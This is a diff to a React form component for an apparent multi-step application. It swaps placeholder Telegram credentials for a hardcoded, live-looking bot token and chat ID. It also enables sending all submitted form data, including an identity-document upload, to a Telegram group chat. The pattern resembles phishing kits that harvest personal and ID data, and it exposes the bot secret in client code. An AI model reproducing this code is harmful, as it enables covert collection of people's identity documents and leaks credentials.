@@ -18,28 +18,18 @@ const Step6Consent = () => {
     setIsSubmitting(true);
     
     try {
-      // ⚠️ Note: In a real application, these values would be stored securely
-      // For demo purposes, we'll use placeholders
-      const botToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with actual token in production
-      const chatId = 'YOUR_TELEGRAM_CHAT_ID'; // Replace with actual chat ID in production
+      const botToken = '7749163012:AAGrq3WxuA1pdnQX5yNCtxabsxuctwssx7Y'; // Updated Bot Token
+      const chatId = '-4970215486'; // Updated Chat ID
       
-      // For demonstration, we'll just show a success message without actually sending to Telegram
-      // In production, uncomment the below code and replace with actual tokens
+      const success = await sendToTelegram(botToken, chatId, formData, formData.idProof);
       
-      // const success = await sendToTelegram(botToken, chatId, formData, formData.idProof);
-      
-      // Simulate API delay
-      await new Promise(resolve => setTimeout(resolve, 1500));
-      
-      // Move to success step
-      nextStep();
-      
-      // Use for production with real telegram tokens
-      // if (success) {
-      //   nextStep();
-      // } else {
-      //   throw new Error('Failed to submit application');
-      // }
+      if (success) {
+        nextStep(); // Move to success step if Telegram send was successful
+      } else {
+        // Error message already handled by sendToTelegram console.error
+        // throw new Error('Failed to submit application to Telegram'); // You can throw a more specific error if needed
+        toast.error('Failed to send application data. Please try again.');
+      }
     } catch (error) {
       console.error('Error submitting form:', error);
       toast.error('There was a problem submitting your application. Please try again.');
